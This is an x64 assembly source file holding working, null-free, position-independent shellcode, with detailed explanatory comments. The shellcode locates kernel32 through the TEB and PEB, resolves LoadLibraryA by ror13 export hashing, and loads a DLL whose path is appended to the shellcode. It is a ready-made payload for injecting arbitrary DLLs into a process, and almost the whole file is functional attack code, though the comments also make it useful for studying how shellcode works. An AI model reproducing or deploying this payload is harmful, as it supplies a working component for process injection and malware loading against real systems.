;
; shLoadLibraryA-x64.asm
;
; Shellcode that calls LoadLibraryA with the dll name appended to its end.
;     Size:      302 bytes
;     Null-free: yes
;
; Refer to https://en.wikipedia.org/wiki/Win32_Thread_Information_Block for details
; Note, TEB and PEB can be studied with expression (_TEB*)fs in Visual Studio "Watch" windows during debug.
; Moreover, some Reserved structure fields names can be obtained with pdbdump utility on MS pdbs with public symbols.
;

public shLoadLibraryA

.code

    ;
    ; shLoadLibraryA
    ;
    ; This routine is the main entry point of the shellcode.
    ;     The code aligns the stack, then finds its start address and calls some utilit routines.
    ;
    ; Parameters:
    ;     None. The asciiz string must be appended to the end of the code, where the code will find it under dllName.
    ;
    shLoadLibraryA proc
        sub     rsp, 028h               ;// 40 bytes of shadow space: 32 for RCX, RDX, R8 and R9 registers, and 8 bytes to align
                                        ;// the stack from previous usage - the return RIP address pushed on the stack.
        and     rsp, 0fffffffffffffff0h ;// Align the stack to a multiple of 16 bytes.

        mov     rax, rsp                ;// 1. get the pointer to accessible memory in the stack, it will be referenced in step 3 below.
        call    $+4                     ;// 2. e8 ff ff ff ff  [after this call RIP will point to the last ff byte in this instruction].
        db      030h                    ;// 3. ff 30 -> push qword ptr [rax].
        pop     rax                     ;// 4. retore stack pointer after previos instruction.
        pop     rax                     ;// 5. pop the value that was pushed by call.
        sub     rax, 010h               ;// 6. rax is now holding the pointer to the beginning of the shLoadLibraryA code.

        mov     rbx, rax                ;// Store the shLoadLibraryA base pointer in rbx.
        mov     rcx, 0 - (getKernel32Base - shLoadLibraryA)
        neg     rcx                     ;// To avoid null bytes. rcx = the relative offset of getKernel32Base symbol.
        add     rax, rcx                ;// Make the address of the getKernel32Base symbol absolute by adding the base address to it.
        call    rax                     ;// Call getKernel32Base, after the call rax = pKernel32Base.

        mov     r8, rbx                 ;// Get the shLoadLibraryA base pointer and store it in r8.
        mov     rcx, 0 - (getProcAddressAsm - shLoadLibraryA)
        neg     rcx                     ;// To avoid null bytes. rcx = the relative offset of getProcAddressAsm symbol.
        add     r8, rcx                 ;// Make the address of the getProcAddressAsm symbol absolute by adding the base address to it.
        mov     rcx, rax                ;// rcx = pKernel32Base, fist argument for the getProcAddressAsm function.
        mov     rdx, 0C6042601260A288Dh ;// rdx = hash of "LoadLibraryA" string, obtained by ror13 hashing approach. Second pararmeter for getProcAddressAsm.
        call    r8                      ;// Call getProcAddressAsm, after the call rax = pLoadLibraryA, or zero.

      lSplit:
        mov     rcx, rbx                ;// Get the shLoadLibraryA base pointer and store it in rcx. It will be fixed up later so, that it will point to dllName symbol.
        mov     rdx, 0 - (dllName - lSplit) ;// dllMain is more than 256 bytes away from the shLoadLibraryA, and this seem to be a problem for masm64, that's why
        neg     rdx                     ;// the first shellcode's chunk size is calculated here, and stored in rdx.
        mov     r9, 0 - (lSplit - shLoadLibraryA) ;// The second shellcode's chunk size is calculated here, and stored in r9.
        neg     r9                      ;// r9 = The size of the second chunk of the shellcode.
        add     rdx, r9                 ;// rdx = The total size of the shellcode, from shLoadLibraryA symbol to dllName symbol.
        add     rcx, rdx                ;// Make the address of the dllName symbol absolute by adding the base address to it.
        test    rax, rax                ;// Check for the value of the LoadLibraryA pointer.
        jz      lExit                   ;// If ZF is set, then exit gracefully to not crash the program. Otherwise,
        call    rax                     ;// call LoadLibraryA(dllName).

      lExit:
        add     rsp, 028h               ;// Cleanup the registers shadow space on the stack.
        ret
    shLoadLibraryA endp


    ;
    ; getKernel32Base
    ;
    ; This routine accesses TEB and obtains the base pointer of the kernel32.dll's PE image, that is loaded in memory.
    ;
    ; Parameters:
    ;     None.
    ;
    getKernel32Base proc
        push    rsi                     ;// Save the rsi value on the stack, because rsi register will be used by lods instructions below.
        xor     rax, rax                ;// Set initial value to zero.
        mov     rax, gs:[rax+060h]      ;// _TEB.Peb (_PEB* Peb)
        mov     rax, [rax+018h]         ;// _PEB.Ldr (_PEB_LDR_DATA* Ldr)
        mov     rsi, [rax+020h]         ;// _PEB_LDR_DATA.InLoadOrderModuleList (_LIST_ENTRY InLoadOrderModuleList)
        lodsq                           ;// _LDR_DATA_TABLE_ENTRY* of ntdll in eax
        mov     rsi, rax                ;// to avoid zeroes in code
        lodsq                           ;// _LDR_DATA_TABLE_ENTRY* of kernel32
        mov     rax, [rax+020h]         ;// _LDR_DATA_TABLE_ENTRY.DllBase
        pop	    rsi                     ;// Restore the value of rsi to the one, that is held before entering the getKernel32Base routine.
        ret
    getKernel32Base endp


    ;
    ; getProcAddressAsm
    ;
    ; This routine is similar to Kernel32.dll!GetProcAddress(HMODULE, LPCSTR), but it accepts ror13 hashes
    ;     instead of the asciiz string and it does not support Forwarded Exported symbols.
    ;
    ; Parameters:
    ;     rcx = image base
    ;     rdx = ror13 hash
    ;
    getProcAddressAsm proc
        push    rbx                     ;// Store register values on the stack. Not using shadow stack memory to make the shellcode shorter.
        push    r8
        push    r9
        push    r10
        push    r11
        push    r14

        movsxd  rax, dword ptr [rcx+3Ch];// Skip over the MSDOS header to the start of the PE header. rax = PIMAGE_DOS_HEADER->e_lfanew.
        xor     r11d, r11d              ;// Initialize to zero the counter of the entries in the AddressOfFunctions/AddressOfNames tables.
        mov     rsi, rdx                ;// Store the 'rotate right for 13 bits' hash of the function name in rsi.
        mov     r10, rcx                ;// Store the image base address in r10.
        mov     r14, 0 - 088h           ;// To avoid null bytes. In r14 the VA of IMAGE_DIRECTORY_ENTRY_EXPORT will be calculated by the next instructions.
        neg     r14                     ;// r14 = 088h. The IMAGE_DATA_DIRECTORY is 0x88 bytes from the start of the PE64 header.
        add     r14, rax                ;// Added the offset from the PE image base to the PE64 headers.
        add     r14, rcx                ;// Make the IMAGE_DIRECTORY_ENTRY_EXPORT address absolute by adding the base address to it.
        mov     r8d, [r14]              ;// Extract the relative address (RVA) of IMAGE_EXPORT_DIRECTORY, as it is the first one in IMAGE_DIRECTORY_ENTRY_EXPORT.
        mov     eax, [r8+rcx+20h]       ;// Extract the AddressOfNames table relative offset and store in eax.
        mov     edi, [r8+rcx+18h]       ;// Extract the NumberOfNames, number of exported items and store it in edi which will be used as the counter.
        mov     ebx, [r8+rcx+1Ch]       ;// Extract the AddressOfFunctions table relative offset, make this address absolute and store it in ebx.
        lea     r9, [rax+rcx]           ;// Make the AddressOfNames table address absolute by adding the base address to it. r9 = VA of AddressOfNames.  
        test    edi, edi                ;// If edi is zero then the last symbol has been checked and as such     
        je      lHashNotFound           ;// jump to the end of the function. If this condition is ever true then the requested symbol was not resolved properly.     
        sub     rbx, rax
      lNextFunction:
        mov     r8d, dword ptr [r9+rbx] ;// Extract relative offset (RVA) of the next function body.
        xor     rcx, rcx                ;// Hash accumulator. Will store the computed hash of the function name string.
        mov     edx, dword ptr [r9]     ;// Extract relative offset (RVA) of the next function name.
        add     r8, r10                 ;// Make the function body address absolute (RVA -> VA) by adding the image base address to it.
        add     rdx, r10                ;// Make the function name address absolute (RVA -> VA) by adding the image base address to it.
      lNextChar:
        mov     rax, [rdx]              ;// To avoid null bytes.
        test    al, al                  ;// Test for the end of the function name.
        je      lCompareHash            ;// If ZF is set the end of the string has been reached. Jump to the end of the hash calculation.
        movsx   rax, byte ptr [rdx]     ;// Get the next function name character to rax.
        ror     rcx, 0Dh                ;// Rotate the current value of the hash 13 bits to the right.
        add     rcx, rax                ;// Add new character to the hash value.
        add     rdx, 1                  ;// Increment the character index pointer inside the function name string.
        jne     lNextChar               ;// Proceed to the next character in the function name.
      lCompareHash:
        cmp     rcx, rsi                ;// Check to see if the computed hash matches the requested hash.
        je      lHashFound              ;// If the hashes match, proceed to the return from this function.
        inc     r11d                    ;// Otherwise, continue enumerating the exported symbol list.
        add     r9, 4                   ;// Increment the pointer to the next offset (RVA) in the AddressOfFunctions table.
        cmp     r11d, edi               ;// Compare the current index in the AddressOfFunctions/AddressOfNames tables with PIMAGE_EXPORT_DIRECTORY->NumberOfNames.
        jb      lNextFunction           ;// If the value in edi is bigger than in r11d, then continue to the next exported symbol, otherwise
      lHashNotFound:                    ;// proceed to function's exit, setting the result to zero.
        xor     rax, rax                ;// The requested symbol was not resolved properly, return zero in this case.
      lReturn:
        pop     r14                     ;// Resotre the previous values of registers
        pop     r11
        pop     r10
        pop     r9
        pop     r8
        pop     rbx
        ret
      lHashFound:
        mov     rax, r8                 ;// Move absolute address of the found funtion to rax register.
        jmp     lReturn
    getProcAddressAsm endp


    ;
    ; dllName
    ;
    ; This piece of data is the terminating null byte of the shellcode.
    ; And this is where the asciiz string with full path to dll name must be appended by the caller.
    ;
    dllName	    db 0                    ;// "ws2_32.dll",0 ; To quickly test the shellcode, uncomment this instead of the zero in "db 0" expression. 


    ;
    ; stringToRor13Hash
    ;
    ; This routine is not part of the shellcode.
    ; But it's rather the utility function to produce  ror13 hashes of the string passed in rcx.
    ;
    ; Parameters:
    ;     rcx = asciiz string to hash
    ;
    stringToRor13Hash proc              ;// rcx - the pointer to the asciiz string.
        mov     rsi, rcx                ;// ror13: 0xC6042601260A288D for LoadLibraryA
        xor     rdi, rdi                ;// Zero rdi as it will hold the hash value for the current symbols function name.
        xor     rax, rax                ;// Zero rax in order to ensure that the high order bytes are zero as this will hold the resulting hash.
        cld
      lComputeHash:
        lodsb                           ;// Load the byte at rsi, the current symbol name, into al and increment rsi.
        test    al, al                  ;// Bitwise test al with itself to see if the end of the string has been reached.
        jz      lHashFinished           ;// If ZF is set the end of the string has been reached. Jump to the end of the hash calculation.
        ror     rdi, 0dh                ;// Rotate the current value of the hash 13 bits to the right.
        add     rdi, rax                ;// Add the current character of the symbol name to the hash accumulator.
        jmp     lComputeHash            ;// Continue looping through the symbol name.
      lHashFinished:
        mov		rax, rdi
        ret
    stringToRor13Hash endp


end